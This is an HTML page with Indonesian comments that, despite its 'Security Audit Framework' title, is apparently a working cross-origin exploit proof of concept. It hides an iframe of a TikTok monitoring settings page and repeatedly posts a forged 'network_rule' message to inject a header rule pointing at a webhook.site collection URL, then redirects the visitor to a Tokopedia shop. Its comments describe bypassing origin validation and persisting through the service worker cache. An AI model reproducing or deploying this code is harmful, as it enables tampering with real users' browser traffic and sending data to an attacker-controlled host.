<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Audit Framework</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        .console { border: 1px solid #00ff00; display: inline-block; padding: 40px; background: #000; box-shadow: 0 0 15px #00ff00; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div class="console">
        <h1 id="status">[ INITIALIZING ]</h1>
        <p id="sub-status" class="blink">Preparing bypass sequence...</p>
        <div id="log" style="font-size: 12px; color: #888; margin-top: 20px;"></div>
    </div>

    <iframe id="pwn_gate" 
            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
            style="display:none;"></iframe>

    <script>
        const gate = document.getElementById('pwn_gate');
        const statusH1 = document.getElementById('status');
        const statusP = document.getElementById('sub-status');
        const logDiv = document.getElementById('log');

        // --- KONFIGURASI WEBHOOK LU ---
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
        const targetSite = "https://shop-id.tokopedia.com/";

        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "zero_click_final_V11",
                global: true,
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: webhook + "?data=pwned_" + Date.now()
                }]
            }]
        };

        function addLog(msg) {
            logDiv.innerHTML += "> " + msg + "<br>";
        }

        gate.onload = function() {
            statusH1.innerText = "[ EXPLOITING ]";
            statusP.innerText = "Bypassing Origin Validation...";
            addLog("Gate Loaded: 200 OK");

            // TEKNIK: MessageChannel Handshake
            // Ini untuk memaksa Service Worker membuka jalur komunikasi
            const channel = new MessageChannel();
            
            addLog("Establishing MessageChannel...");
            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*", [channel.port2]);

            setTimeout(() => {
                addLog("Firing Cross-Origin Payload...");
                
                let count = 0;
                const bomb = setInterval(() => {
                    try {
                        // Tembak via postMessage Standar
                        gate.contentWindow.postMessage(payload, "*");
                        
                        // Tembak via MessageChannel Port
                        channel.port1.postMessage(payload);
                    } catch(e) {}

                    count++;
                    if (count >= 60) {
                        clearInterval(bomb);
                        statusH1.innerText = "[ PERSISTING ]";
                        statusP.innerText = "Syncing with Cache Storage (10s)...";
                        addLog("Injection complete. Waiting for sync...");
                        
                        // Jeda agar Service Worker selesai menulis ke Cache
                        setTimeout(() => {
                            statusH1.innerText = "[ EXECUTING ]";
                            addLog("Redirecting to target...");
                            location.href = targetSite;
                        }, 10000);
                    }
                }, 100);
            }, 1000);
        };
    </script>
</body>
</html>
